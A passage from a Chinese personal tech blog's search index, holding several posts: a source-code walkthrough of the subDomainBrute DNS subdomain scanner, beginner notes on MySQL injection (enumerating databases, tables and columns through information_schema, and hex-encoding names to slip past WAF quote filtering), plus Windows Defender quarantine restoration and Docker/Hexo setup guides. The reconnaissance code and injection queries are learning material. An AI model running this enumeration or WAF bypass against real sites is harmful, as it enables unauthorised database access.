class="hljs-built_in">sorted</span>([answer.host <span class="hljs-keyword">for</span> answer <span class="hljs-keyword">in</span> answers]))<br>                <span class="hljs-keyword">if</span> ips <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;1.1.1.1&#x27;</span>, <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-string">&#x27;0.0.0.1&#x27;</span>]:<br>                    <span class="hljs-keyword">continue</span><br>                <span class="hljs-keyword">if</span> self.options.i <span class="hljs-keyword">and</span> is_intranet(answers[<span class="hljs-number">0</span>].host):<br>                    <span class="hljs-keyword">continue</span><br><br>                <span class="hljs-keyword">try</span>:<br>                    self.scan_count_local += <span class="hljs-number">1</span><br>                    answers = <span class="hljs-keyword">await</span> self.resolvers[j].query(cur_domain, <span class="hljs-string">&#x27;CNAME&#x27;</span>)<br>                    cname = answers[<span class="hljs-number">0</span>].target.to_unicode().rstrip(<span class="hljs-string">&#x27;.&#x27;</span>)<br>                    <span class="hljs-keyword">if</span> cname.endswith(self.domain) <span class="hljs-keyword">and</span> cname <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.found_subs:<br>                        cname_sub = cname[:<span class="hljs-built_in">len</span>(cname) - <span class="hljs-built_in">len</span>(self.domain) - <span class="hljs-number">1</span>]    <span class="hljs-comment"># new sub</span><br>                        <span class="hljs-keyword">if</span> cname_sub <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.normal_names_set:<br>                            self.found_subs.add(cname)<br>                            <span class="hljs-keyword">await</span> self.queue.put((<span class="hljs-number">0</span>, cname_sub))<br>                <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                    <span class="hljs-keyword">pass</span><br><br>                first_level_sub = sub.split(<span class="hljs-string">&#x27;.&#x27;</span>)[-<span class="hljs-number">1</span>]<br>                max_found = <span class="hljs-number">20</span><br><br>                <span class="hljs-keyword">if</span> self.options.w:<br>                    first_level_sub = <span class="hljs-string">&#x27;&#x27;</span><br>                    max_found = <span class="hljs-number">3</span><br><br>                <span class="hljs-keyword">if</span> (first_level_sub, ips) <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.ip_dict:<br>                    self.ip_dict[(first_level_sub, ips)] = <span class="hljs-number">1</span><br>                <span class="hljs-keyword">else</span>:<br>                    self.ip_dict[(first_level_sub, ips)] += <span class="hljs-number">1</span><br>                    <span class="hljs-keyword">if</span> self.ip_dict[(first_level_sub, ips)] &gt; max_found:<br>                        <span class="hljs-keyword">continue</span><br><br>                self.found_count_local += <span class="hljs-number">1</span><br><br>                self.outfile.write(cur_domain.ljust(<span class="hljs-number">30</span>) + <span class="hljs-string">&#x27;\t&#x27;</span> + ips + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>                self.outfile.flush()<br>                <span class="hljs-keyword">try</span>:<br>                    self.scan_count_local += <span class="hljs-number">1</span><br>                    <span class="hljs-keyword">await</span> self.resolvers[j].query(<span class="hljs-string">&#x27;lijiejie-test-not-existed.&#x27;</span> + cur_domain, <span class="hljs-string">&#x27;A&#x27;</span>)<br>                <span class="hljs-keyword">except</span> aiodns.error.DNSError <span class="hljs-keyword">as</span> e:<br>                    <span class="hljs-keyword">if</span> e.args[<span class="hljs-number">0</span>] <span class="hljs-keyword">in</span> [<span class="hljs-number">4</span>]:<br>                        <span class="hljs-keyword">if</span> self.queue.qsize() &lt; <span class="hljs-number">50000</span>:<br>                            <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> self.next_subs:<br>                                <span class="hljs-keyword">await</span> self.queue.put((<span class="hljs-number">0</span>, _ + <span class="hljs-string">&#x27;.&#x27;</span> + sub))<br>                        <span class="hljs-keyword">else</span>:<br>                            <span class="hljs-keyword">await</span> self.queue.put((<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;&#123;next_sub&#125;.&#x27;</span> + sub))<br>                <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                    <span class="hljs-keyword">pass</span><br><br>        <span class="hljs-keyword">except</span> aiodns.error.DNSError <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">if</span> e.args[<span class="hljs-number">0</span>] <span class="hljs-keyword">in</span> [<span class="hljs-number">1</span>, <span class="hljs-number">4</span>]:<br>                <span class="hljs-keyword">pass</span><br>            <span class="hljs-keyword">elif</span> e.args[<span class="hljs-number">0</span>] <span class="hljs-keyword">in</span> [<span class="hljs-number">11</span>, <span class="hljs-number">12</span>]:   <span class="hljs-comment"># 12 timeout   # (11, &#x27;Could not contact DNS servers&#x27;)</span><br>                <span class="hljs-comment"># print(&#x27;timed out sub %s&#x27; % sub)</span><br>                self.timeout_subs[sub] = self.timeout_subs.get(sub, <span class="hljs-number">0</span>) + <span class="hljs-number">1</span><br>                <span class="hljs-keyword">if</span> self.timeout_subs[sub] &lt;= <span class="hljs-number">1</span>:<br>                    <span class="hljs-keyword">await</span> self.queue.put((<span class="hljs-number">0</span>, sub))  <span class="hljs-comment"># Retry</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(e)<br>        <span class="hljs-keyword">except</span> asyncio.TimeoutError <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">pass</span><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">import</span> traceback<br>            traceback.print_exc()<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;errors.log&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-keyword">as</span> errFile:<br>                errFile.write(<span class="hljs-string">&#x27;[%s] %s\n&#x27;</span> % (<span class="hljs-built_in">type</span>(e), <span class="hljs-built_in">str</span>(e)))<br></code></pre></td></tr></table></figure><p>首先是随机选择了一个DNS解析器，然后的一大段代码都在处理a五位a-z的爆破。接下来就是正式的查询步骤</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">answers = <span class="hljs-keyword">await</span> self.resolvers[j].query(cur_domain, <span class="hljs-string">&#x27;A&#x27;</span>)<br></code></pre></td></tr></table></figure><p>通过这条语句使用aiodns查询了域名的A记录，如果有结果，再查询该域名的CNAME记录，从CNAME中反查出子域名加入到结果中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">answers = <span class="hljs-keyword">await</span> self.resolvers[j].query(cur_domain, <span class="hljs-string">&#x27;CNAME&#x27;</span>)<br></code></pre></td></tr></table></figure><p>关于各种DNS查询类型，可以自己百度，这里就不做更多展开了。接下来似乎是在处理泛解析的问题，很迷惑这里怎么又写了一遍。最后就是在处理aiodns抛出的异常的代码，如DNS中没有对应的子域名，超时等问题。</p><p>总结一下subDomainBrute的整个程序流程：</p><pre><code class=" mermaid">graph LRa0(加载子域名字典)--&gt;a1(DNS可靠性检测优选)--&gt;a2(泛解析域名检测)--&gt;a3(DNS轮询暴破子域名)--&gt;a4(CNAME记录反查子域名)--&gt;a5(输出结果)</code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过本次源码分析，学到了：</p><ul><li><p>子域名扫描的步骤和流程</p></li><li><p>DNS服务器可靠性检测判断</p></li><li><p>如何检测一个域名是否为泛解析域名</p></li><li><p>可以优化DNS的筛选步骤，如可以预先对可用DNS进行测速，选择最快的DNS服务器进行查询</p></li><li><p>扫描方法过于单一，只支持暴力查询，可以加入如搜索引擎查询等其他方法使扫描结果更为全面</p></li><li><p>代码存在冗余，优化以后可以更为简洁明了</p></li></ul><p>总的来说这是一款不错的子域名扫描器，速度快也较为精准，但仍然存在可以优化的空间。</p>]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mysql注入学习笔记</title>
    <link href="/2021/02/01/mysql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2021/02/01/mysql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="第一节-information-schema"><a href="#第一节-information-schema" class="headerlink" title="第一节 information_schema"></a>第一节 information_schema</h2><p>在注入中，我们想跨库查询，搜索别的数据库的数据。就需要确定库名-&gt;表名-&gt;字段名，依照这个顺序来搜索到我们想要的数据。需要注意的是查询information_schema的权限需要比较大才可以。 </p><p>通常我们在数据库命令行中获取库名表名字段名的方式是这样的：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> databases;<br><span class="hljs-keyword">show</span> tables;<br><span class="hljs-keyword">desc</span> [tablename];<br></code></pre></td></tr></table></figure><p>但是在sql注入中，我们是在现有的语句中注入查询，这些被注入的语句一般是select，无法使用show命令，所以我们需要使用select来获取整个数据库中库名表名等信息。而information_schema这个表里刚好存有所有的库名和表名，于是我们就可以通过select查询这个表来获取相关信息。</p><p>库名相关信息在schemata这个表中，所以通过information_schema.schemata查所有数据库：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> information_schema.schemata;<br></code></pre></td></tr></table></figure><p>表名相关信息 在tables这个表中，所以通过information_schema.tables查所有的表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> information_schema.tables;<br></code></pre></td></tr></table></figure><p>也可以用上一步查到的库名作为条件来筛选，在后面加上<code>where table_schema=&#39;mysql&#39;</code></p><p>但如果有WAF的话可能会阻止或过滤掉引号，那我们可以用库名的十六进制格式来代替xxx的部分，可以用<code>select hex(&#39;xxx&#39;)</code>来获取十六进制的库名，如“mysql”&#x3D; “0x6D7973716C”，所以上面的语句变为<code>where table_schema=0x6D7973716C</code>就可以绕过WAF了。</p><p>查字段名在columns这个表中，用以下语句来查字段名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;xx&#x27;</span> <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;xx&#x27;</span>;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用命令行恢复Windows Defender隔离区</title>
    <link href="/2021/01/30/%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%81%A2%E5%A4%8DWindows-Defender%E9%9A%94%E7%A6%BB%E5%8C%BA/"/>
    <url>/2021/01/30/%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%81%A2%E5%A4%8DWindows-Defender%E9%9A%94%E7%A6%BB%E5%8C%BA/</url>
    
    <content type="html"><![CDATA[<h3 id="闲话"><a href="#闲话" class="headerlink" title="闲话"></a>闲话</h3><p>刚装完系统，win10默认打开了Windows Defender（以下简称WD）。在我打开u盘时，直接把我u盘里的一些工具当成病毒杀掉了。最令我迷惑的是我进入WD查杀历史记录时却是空的。隔离区也找不到地方进去…于是，尝试使用命令行恢复。</p><h3 id="步骤一"><a href="#步骤一" class="headerlink" title="步骤一"></a>步骤一</h3><p>以”管理员身份运行“命令提示符，并进入WD所在的文件夹</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">cd C:<span class="hljs-string">\Program</span> Files<span class="hljs-string">\Windows</span> Defender<br></code></pre></td></tr></table></figure><h3 id="步骤二"><a href="#步骤二" class="headerlink" title="步骤二"></a>步骤二</h3><p>接着查看是否存在mpcmdrun.exe这个文件，这个文件可以用来在CMD下控制WD进行病毒扫描、更新病毒库、控制隔离区等操作</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">dir</span> <span class="hljs-regexp">*.exe</span><br></code></pre></td></tr></table></figure><h3 id="步骤三"><a href="#步骤三" class="headerlink" title="步骤三"></a>步骤三</h3><p>列出系统中所有的隔离项目</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos">mpcmdrun -<span class="hljs-built_in">restore</span> -listall<br></code></pre></td></tr></table></figure><h3 id="步骤四"><a href="#步骤四" class="headerlink" title="步骤四"></a>步骤四</h3><p>恢复所有的隔离项目（谨慎操作），至此WD内的所有隔离项目恢复完毕</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">mpcmdrun -restore -<span class="hljs-keyword">all</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>技术</tag>
      
      <tag>Windows Defender</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用docker搭建Hexo</title>
    <link href="/2021/01/29/%E4%BD%BF%E7%94%A8docker%E6%90%AD%E5%BB%BAHexo/"/>
    <url>/2021/01/29/%E4%BD%BF%E7%94%A8docker%E6%90%AD%E5%BB%BAHexo/</url>
    
    <content type="html"><![CDATA[<h3 id="闲话"><a href="#闲话" class="headerlink" title="闲话"></a>闲话</h3><p>我不想在宿主机上安装Nodejs，于是就有了这篇文章。本文的目的就在于让写作的人只专注于写作这件事本身，而无需关注写作平台的构建。以后我也会逐渐将各种中间件使用docker的方式构建，让runtime开箱即用，让Coding也成为纯粹的Coding，在Coding时无需花时间在运行环境的配置。</p><h3 id="使用dockerfile构建镜像"><a href="#使用dockerfile构建镜像" class="headerlink" title="使用dockerfile构建镜像"></a>使用dockerfile构建镜像</h3><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> node:<span class="hljs-number">15.7</span>.<span class="hljs-number">0</span>-alpine3.<span class="hljs-number">10</span><br><span class="hljs-keyword">MAINTAINER</span> wanf3ng &lt;wanf3ng@gmail.com&gt;<br><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /usr/blog</span><br><br><span class="hljs-comment"># 切换中科大源</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> sed -i <span class="hljs-string">&#x27;s/dl-cdn.alpinelinux.org/mirrors.ustc.edu.cn/g&#x27;</span> /etc/apk/repositories</span><br><span class="hljs-comment"># 安装bash git openssh 以及c的编译工具</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apk add bash git openssh</span><br><br><span class="hljs-comment"># 设置容器时区为上海，不然发布文章的时间是国际时间，也就是比我们晚8个小时</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apk add tzdata &amp;&amp; <span class="hljs-built_in">cp</span> /usr/share/zoneinfo/Asia/Shanghai /etc/localtime \</span><br><span class="language-bash">&amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Asia/Shanghai&quot;</span> &gt; /etc/timezone \</span><br><span class="language-bash">&amp;&amp; apk del tzdata</span><br><br><span class="hljs-comment"># 安装hexo</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> \ </span><br>npm config set registry https://registry.npm.taobao.org \<br>&amp;&amp;npm install \<br>&amp;&amp;npm install hexo-cli -g \<br>&amp;&amp; npm install hexo-server --save \<br>&amp;&amp; npm install hexo-asset-image --save \<br>&amp;&amp; npm install hexo-wordcount --save \<br>&amp;&amp; npm install hexo-generator-sitemap --save \<br>&amp;&amp; npm install hexo-generator-baidu-sitemap --save \<br>&amp;&amp; npm install hexo-deployer-git --save<br><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">4000</span><br></code></pre></td></tr></table></figure><p>构建完image后也可以push到dockerhub方便以后使用，以后只需pull即可，如：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">docker pull wanf3ng/blog<br></code></pre></td></tr></table></figure><h3 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h3><p>将容器内的&#x2F;usr&#x2F;blog映射到本地D:\myblog\</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># 设置本地的外挂文件夹</span><br>docker run -d -ti -p 4000:4000 -v d:\myblog\:/usr/blog/ blog /bin/bash<br></code></pre></td></tr></table></figure><h3 id="进入容器内验证是否安装完成"><a href="#进入容器内验证是否安装完成" class="headerlink" title="进入容器内验证是否安装完成"></a>进入容器内验证是否安装完成</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># 进入容器</span><br>docker <span class="hljs-built_in">exec</span> -it [container ID] /bin/bash<br><span class="hljs-comment"># 初始化博客</span><br>hexo init<br><span class="hljs-comment"># 生成静态文件</span><br>hexo g<br><span class="hljs-comment"># 启动hexo预览服务器</span><br>hexo s<br></code></pre></td></tr></table></figure><h3 id="设置主题"><a href="#设置主题" class="headerlink" title="设置主题"></a>设置主题</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">npm install --save hexo-theme-fluid<br></code></pre></td></tr></table></figure><p>然后在博客目录下创建 <code>_config.fluid.yml</code>，将主题的 <a href="https://github.com/fluid-dev/hexo-theme-fluid/blob/master/_config.yml">_config.yml (opens new window)</a>内容复制过去。</p><h3 id="配置git一键发布"><a href="#配置git一键发布" class="headerlink" title="配置git一键发布"></a>配置git一键发布</h3><p>用<code>ssh-keygen</code>命令生成ssh key，将<code>~/.ssh/id_rsa.pub</code>里的内容复制到Github</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># 生成ssh key</span><br>ssh-keygen -t rsa -C <span class="hljs-string">&quot;youremail@example.com&quot;</span> <span class="hljs-comment"># 全程回车</span><br>git config --global user.name <span class="hljs-string">&quot;你用github用户名&quot;</span><br>git config --global user.email <span class="hljs-string">&quot;你的github邮箱地址&quot;</span><br></code></pre></td></tr></table></figure><p>配置<code>_config.yml</code>文件</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">deploy:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">git</span><br>  <span class="hljs-attr">repo:</span> <span class="hljs-string">git@github.com:wanf3ng/wanf3ng.github.io.git</span><br>  <span class="hljs-attr">branch:</span> <span class="hljs-string">master</span>                                        <span class="hljs-comment"># 设置提交到的分支</span><br>  <span class="hljs-attr">message:</span> <span class="hljs-string">Site</span> <span class="hljs-string">updated</span> <span class="hljs-string">at</span> &#123;&#123; <span class="hljs-string">now(&quot;YYYY-MM-DD</span> <span class="hljs-string">HH:mm:ss&quot;)</span> &#125;&#125; <span class="hljs-comment"># 设置我们提交的信息</span><br></code></pre></td></tr></table></figure><p>最后使用<code>hexo g -d</code>就可以一键部署了，如果要在宿主机上一键部署，只需输入以下命令即可，也可以写成脚本文件执行</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">docker <span class="hljs-built_in">exec</span> -it [container ID] /bin/bash -c <span class="hljs-string">&#x27;cd /usr/blog &amp;&amp; hexo g -d&#x27;</span><br></code></pre></td></tr></table></figure><p>注：如果安装了<code>hexo-all-minifier</code>用来压缩生成文件，需要额外安装c程序的编译工具</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">apk add libtool automake autoconf nasm gcc g++ make<br></code></pre></td></tr></table></figure><p>在使用npm安装完后需要把<code>node_module</code>删掉，用yarn重新编译一下。因为在容器里npm不编译<code>hexo-all-minifier</code>的一些C++依赖包，rebuild也没用。而yarn会编译，所以是个挺奇怪的bug。</p>]]></content>
    
    
    <categories>
      
      <category>Hexo</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Docker</tag>
      
      <tag>技术</tag>
      
      <tag>Hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker起手式</title>
    <link href="/2021/01/29/docker%E8%B5%B7%E6%89%8B%E5%BC%8F/"/>
    <url>/2021/01/29/docker%E8%B5%B7%E6%89%8B%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<h3 id="Clone"><a href="#Clone" class="headerlink" title="Clone"></a>Clone</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker run --name repo alpine/git clone \<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/docker/g</span>etting-statred.git<br>docker cp repo:<span class="hljs-regexp">/git/g</span>etting-started/ .<br></code></pre></td></tr></table></figure><h3 id="Build"><a href="#Build" class="headerlink" title="Build"></a>Build</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> getting-started<br>docker build -t docker101tutorial .<br></code></pre></td></tr></table></figure><h3 id="Run"><a href="#Run" class="headerlink" title="Run"></a>Run</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">docker <span class="hljs-built_in">run</span> -dp <span class="hljs-number">80</span>:<span class="hljs-number">80</span> \<br><span class="hljs-comment">--name docker-tutorial docker101tutorial</span><br></code></pre></td></tr></table></figure><h3 id="Share"><a href="#Share" class="headerlink" title="Share"></a>Share</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">docker <span class="hljs-keyword">tag</span> <span class="hljs-title">docker101tutorial</span> wanf3ng/docker101tutorial<br>docker push wanf3ng/docker101tutorial<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Docker</tag>
      
      <tag>技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2021/01/29/hello-world/"/>
    <url>/2021/01/29/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
